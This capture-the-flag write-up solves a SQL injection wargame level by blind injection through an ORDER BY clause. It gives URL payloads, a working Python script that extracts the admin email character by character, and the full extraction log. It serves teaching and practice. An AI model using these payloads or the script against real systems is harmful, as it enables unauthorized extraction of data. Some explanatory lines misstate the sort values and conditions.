---
custom_edit_url: null
pagination_next: null
pagination_prev: null
sidebar_position: 23
---

![1](https://github.com/Kunull/Write-ups/assets/110326359/50a38bf9-d127-4ab6-ad25-321eb0130c99)

We are provided with the SQL queries:

```sql
SELECT id,email,score FROM prob_hell_fire WHERE 1 ORDER BY {$_GET[order]}
```

```sql
SELECT email FROM prob_hell_fire WHERE id='admin' AND email='{$_GET[email]}'`
```

This challenge returns the output in the form of a table.

If we provide the following URI parameter:

```
?order=id
```

The resultant query becomes:

```sql
SELECT id,email,score FROM prob_hell_fire WHERE 1 ORDER BY id
```

![2](https://github.com/Kunull/Write-ups/assets/110326359/a1e61aae-d070-4cea-b385-c1e6cd9195fb)

There are two users: `admin` and `rubiya`.

We can solve this challenge using two different methods:
1. Assigning sort value
2. Sorting by different columns

## Blind SQL Injection - (Assigning different sort value)

In this method, we will assign a sort value to the result that we want.

### Retrieving the email length

If we provide the following URI parameter:

```
?order=if(id='admin' AND length(email)=1, 1, 2)
```

The resultant query becomes:

```sql
SELECT id,email,score FROM prob_hell_fire WHERE 1 ORDER BY if(id='admin' AND length(email)=num, 1, 2)
```

Rows where `id='admin'` and `length(email)=1` will be given a sort value of 1 and will appear first. All other rows will be given a sort value of 3 and will appear afterwards.

![3](https://github.com/Kunull/Write-ups/assets/110326359/69eee14a-1f35-4577-a4bf-794968d7b3c0)

Since the `admin` user is not sorted first, it means that `id='admin' AND length(email)=1` did not result in `True`. This tells us that the email length is greater than 1.

We can move onto greater values:

```
?order=if(id='admin' AND length(email)=28, 1, 2)
```

The resultant query becomes:

```sql
SELECT id,email,score FROM prob_hell_fire WHERE 1 ORDER BY if(id='admin' AND length(email)=28, 1, 2)
```

![4](https://github.com/Kunull/Write-ups/assets/110326359/3fb5f2f3-0632-4a05-9710-787bed3e5706)

Since the `admin` user is sorted first, it means that `id='admin' AND length(email)=1` resulted in `True`. This tells us that the email length is 28.
### Leaking the password

If we provide the following URI parameter:

```
?order=if(id='admin' AND substr(email, 1, 1)='0', 1, 2)
```

The resultant query becomes:

```sql
SELECT id,email,score FROM prob_hell_fire WHERE 1 ORDER BY if(id='admin' AND substr(email, 1, 1)='0', 1, 2)
```

Rows where `id='admin'` and `length(email)=1` will be given a sort value of 1 and will appear first. All other rows will be given a sort value of 3 and will appear afterwards.

![6](https://github.com/Kunull/Write-ups/assets/110326359/2c496b75-0a47-4745-8587-13851ba99c00)

Since the `admin` user is not sorted first, it means that `id='admin' AND substr(email, 1, 1)='0'` did not result in `True`. This tells us that the first character of the email is not `0`.

We can move onto other characters:

```
?order=if(id='admin' AND substr(email, 1, 1)='a', 1, 2)
```

The resultant query becomes:

```sql
SELECT id,email,score FROM prob_hell_fire WHERE 1 ORDER BY if(id='admin' AND substr(email, 1, 1)='a', 1, 2)
```

![[7 74.png]]

Since the `admin` user is first, it means that `id='admin' AND substr(email, 1, 1)='0'` resulted in `True`. This tells us that the first character of the email is `a`.

We can leak out all 28 character this way.

```
admin_secure_email@emai1.com
```
### Script

We can automate this process using a script. Since `_` and `.` are filtered out, we will have to convert these characters into their ASCII representation using the `ord()` function.

```python title="hell_fire_script.py"
import requests
import urllib.parse
import string

cookies = {'PHPSESSID': 'fgpbvjdctvq3qasns4lba8a85p'}
url = "https://los.rubiya.kr/chall/hell_fire_309d5f471fbdd4722d221835380bb805.php"
password_length = 0

for x in range(0, 100):
  payload = f"if(id='admin' and length(email)={x}, 1, 2)"
  encoded_payload = urllib.parse.quote_plus(payload)
  full_url = f"{url}?order={encoded_payload}"
    
  response = requests.get(full_url, cookies=cookies)
    
  if "<table border=1><tr><th>id</th><th>email</th><th>score</th><tr><td>admin</td>" in response.text:
    password_length = x
    break

print()    
print(f"[!] Payload: ?order={payload}")
print(f"[!] Payload (URL encoded): ?order={encoded_payload}")
print(f"[!] Email length: {password_length}")

password = ""
searchspace = '_@.' +  string.digits + string.ascii_letters

print(searchspace)

for index in range(1, password_length + 1):
  for char in searchspace:
    payload = f"if(id='admin' AND ord(substr(email, {index}, 1))='{ord(char)}', 1, 2)"
    encoded_payload = urllib.parse.quote_plus(payload)
    full_url = f"{url}?order={encoded_payload}"

    response = requests.get(full_url, cookies=cookies)

    if "<table border=1><tr><th>id</th><th>email</th><th>score</th><tr><td>admin</td>" in response.text:
      password += char
      print()
      print(f"[+] Payload: ?order={payload}")
      print(f"[+] Payload (URL encoded): ?order={encoded_payload}")
      print(f"[+] Character at index {index}: {char}")
      break

print()
print(f"[!] Extracted email: {password}")
print(f"[!] Final payload: ?email={password}")
```

```
$ python .\hell_fire_script.py

[!] Payload: ?order=if(id='admin' and length(email)=28, 1, 2)
[!] Payload (URL encoded): ?order=if%28id%3D%27admin%27+and+length%28email%29%3D28%2C+1%2C+2%29
[!] Email length: 28

[+] Payload: ?order=if(id='admin' AND ord(substr(email, 1, 1))='97', 1, 2)
[+] Payload (URL encoded): ?order=if%28id%3D%27admin%27+AND+ord%28substr%28email%2C+1%2C+1%29%29%3D%2797%27%2C+1%2C+2%29
[+] Character at index 1: a

[+] Payload: ?order=if(id='admin' AND ord(substr(email, 2, 1))='100', 1, 2)
[+] Payload (URL encoded): ?order=if%28id%3D%27admin%27+AND+ord%28substr%28email%2C+2%2C+1%29%29%3D%27100%27%2C+1%2C+2%29
[+] Character at index 2: d

[+] Payload: ?order=if(id='admin' AND ord(substr(email, 3, 1))='109', 1, 2)
[+] Payload (URL encoded): ?order=if%28id%3D%27admin%27+AND+ord%28substr%28email%2C+3%2C+1%29%29%3D%27109%27%2C+1%2C+2%29
[+] Character at index 3: m

[+] Payload: ?order=if(id='admin' AND ord(substr(email, 4, 1))='105', 1, 2)
[+] Payload (URL encoded): ?order=if%28id%3D%27admin%27+AND+ord%28substr%28email%2C+4%2C+1%29%29%3D%27105%27%2C+1%2C+2%29
[+] Character at index 4: i

[+] Payload: ?order=if(id='admin' AND ord(substr(email, 5, 1))='110', 1, 2)
[+] Payload (URL encoded): ?order=if%28id%3D%27admin%27+AND+ord%28substr%28email%2C+5%2C+1%29%29%3D%27110%27%2C+1%2C+2%29
[+] Character at index 5: n

[+] Payload: ?order=if(id='admin' AND ord(substr(email, 6, 1))='95', 1, 2)
[+] Payload (URL encoded): ?order=if%28id%3D%27admin%27+AND+ord%28substr%28email%2C+6%2C+1%29%29%3D%2795%27%2C+1%2C+2%29
[+] Character at index 6: _

[+] Payload: ?order=if(id='admin' AND ord(substr(email, 7, 1))='115', 1, 2)
[+] Payload (URL encoded): ?order=if%28id%3D%27admin%27+AND+ord%28substr%28email%2C+7%2C+1%29%29%3D%27115%27%2C+1%2C+2%29
[+] Character at index 7: s

[+] Payload: ?order=if(id='admin' AND ord(substr(email, 8, 1))='101', 1, 2)
[+] Payload (URL encoded): ?order=if%28id%3D%27admin%27+AND+ord%28substr%28email%2C+8%2C+1%29%29%3D%27101%27%2C+1%2C+2%29
[+] Character at index 8: e

[+] Payload: ?order=if(id='admin' AND ord(substr(email, 9, 1))='99', 1, 2)
[+] Payload (URL encoded): ?order=if%28id%3D%27admin%27+AND+ord%28substr%28email%2C+9%2C+1%29%29%3D%2799%27%2C+1%2C+2%29
[+] Character at index 9: c

[+] Payload: ?order=if(id='admin' AND ord(substr(email, 10, 1))='117', 1, 2)
[+] Payload (URL encoded): ?order=if%28id%3D%27admin%27+AND+ord%28substr%28email%2C+10%2C+1%29%29%3D%27117%27%2C+1%2C+2%29
[+] Character at index 10: u

[+] Payload: ?order=if(id='admin' AND ord(substr(email, 11, 1))='114', 1, 2)
[+] Payload (URL encoded): ?order=if%28id%3D%27admin%27+AND+ord%28substr%28email%2C+11%2C+1%29%29%3D%27114%27%2C+1%2C+2%29
[+] Character at index 11: r

[+] Payload: ?order=if(id='admin' AND ord(substr(email, 12, 1))='101', 1, 2)
[+] Payload (URL encoded): ?order=if%28id%3D%27admin%27+AND+ord%28substr%28email%2C+12%2C+1%29%29%3D%27101%27%2C+1%2C+2%29
[+] Character at index 12: e

[+] Payload: ?order=if(id='admin' AND ord(substr(email, 13, 1))='95', 1, 2)
[+] Payload (URL encoded): ?order=if%28id%3D%27admin%27+AND+ord%28substr%28email%2C+13%2C+1%29%29%3D%2795%27%2C+1%2C+2%29
[+] Character at index 13: _

[+] Payload: ?order=if(id='admin' AND ord(substr(email, 14, 1))='101', 1, 2)
[+] Payload (URL encoded): ?order=if%28id%3D%27admin%27+AND+ord%28substr%28email%2C+14%2C+1%29%29%3D%27101%27%2C+1%2C+2%29
[+] Character at index 14: e

[+] Payload: ?order=if(id='admin' AND ord(substr(email, 15, 1))='109', 1, 2)
[+] Payload (URL encoded): ?order=if%28id%3D%27admin%27+AND+ord%28substr%28email%2C+15%2C+1%29%29%3D%27109%27%2C+1%2C+2%29
[+] Character at index 15: m

[+] Payload: ?order=if(id='admin' AND ord(substr(email, 16, 1))='97', 1, 2)
[+] Payload (URL encoded): ?order=if%28id%3D%27admin%27+AND+ord%28substr%28email%2C+16%2C+1%29%29%3D%2797%27%2C+1%2C+2%29
[+] Character at index 16: a

[+] Payload: ?order=if(id='admin' AND ord(substr(email, 17, 1))='105', 1, 2)
[+] Payload (URL encoded): ?order=if%28id%3D%27admin%27+AND+ord%28substr%28email%2C+17%2C+1%29%29%3D%27105%27%2C+1%2C+2%29
[+] Character at index 17: i

[+] Payload: ?order=if(id='admin' AND ord(substr(email, 18, 1))='108', 1, 2)
[+] Payload (URL encoded): ?order=if%28id%3D%27admin%27+AND+ord%28substr%28email%2C+18%2C+1%29%29%3D%27108%27%2C+1%2C+2%29
[+] Character at index 18: l

[+] Payload: ?order=if(id='admin' AND ord(substr(email, 19, 1))='64', 1, 2)
[+] Payload (URL encoded): ?order=if%28id%3D%27admin%27+AND+ord%28substr%28email%2C+19%2C+1%29%29%3D%2764%27%2C+1%2C+2%29
[+] Character at index 19: @

[+] Payload: ?order=if(id='admin' AND ord(substr(email, 20, 1))='101', 1, 2)
[+] Payload (URL encoded): ?order=if%28id%3D%27admin%27+AND+ord%28substr%28email%2C+20%2C+1%29%29%3D%27101%27%2C+1%2C+2%29
[+] Character at index 20: e

[+] Payload: ?order=if(id='admin' AND ord(substr(email, 21, 1))='109', 1, 2)
[+] Payload (URL encoded): ?order=if%28id%3D%27admin%27+AND+ord%28substr%28email%2C+21%2C+1%29%29%3D%27109%27%2C+1%2C+2%29
[+] Character at index 21: m

[+] Payload: ?order=if(id='admin' AND ord(substr(email, 22, 1))='97', 1, 2)
[+] Payload (URL encoded): ?order=if%28id%3D%27admin%27+AND+ord%28substr%28email%2C+22%2C+1%29%29%3D%2797%27%2C+1%2C+2%29
[+] Character at index 22: a

[+] Payload: ?order=if(id='admin' AND ord(substr(email, 23, 1))='105', 1, 2)
[+] Payload (URL encoded): ?order=if%28id%3D%27admin%27+AND+ord%28substr%28email%2C+23%2C+1%29%29%3D%27105%27%2C+1%2C+2%29
[+] Character at index 23: i

[+] Payload: ?order=if(id='admin' AND ord(substr(email, 24, 1))='49', 1, 2)
[+] Payload (URL encoded): ?order=if%28id%3D%27admin%27+AND+ord%28substr%28email%2C+24%2C+1%29%29%3D%2749%27%2C+1%2C+2%29
[+] Character at index 24: 1

[+] Payload: ?order=if(id='admin' AND ord(substr(email, 25, 1))='46', 1, 2)
[+] Payload (URL encoded): ?order=if%28id%3D%27admin%27+AND+ord%28substr%28email%2C+25%2C+1%29%29%3D%2746%27%2C+1%2C+2%29
[+] Character at index 25: .

[+] Payload: ?order=if(id='admin' AND ord(substr(email, 26, 1))='99', 1, 2)
[+] Payload (URL encoded): ?order=if%28id%3D%27admin%27+AND+ord%28substr%28email%2C+26%2C+1%29%29%3D%2799%27%2C+1%2C+2%29
[+] Character at index 26: c

[+] Payload: ?order=if(id='admin' AND ord(substr(email, 27, 1))='111', 1, 2)
[+] Payload (URL encoded): ?order=if%28id%3D%27admin%27+AND+ord%28substr%28email%2C+27%2C+1%29%29%3D%27111%27%2C+1%2C+2%29
[+] Character at index 27: o

[+] Payload: ?order=if(id='admin' AND ord(substr(email, 28, 1))='109', 1, 2)
[+] Payload (URL encoded): ?order=if%28id%3D%27admin%27+AND+ord%28substr%28email%2C+28%2C+1%29%29%3D%27109%27%2C+1%2C+2%29
[+] Character at index 28: m

[!] Extracted email: admin_secure_email@emai1.com
[!] Final payload: ?email=admin_secure_email@emai1.com
```

If we provide the following URI parameter:

```
?email=admin%5Fsecure%5Femail@emai1.com
```

The resultant query becomes:

```sql
SELECT email FROM prob_hell_fire WHERE id='admin' AND email='admin_secure_email@emai1.com'
```
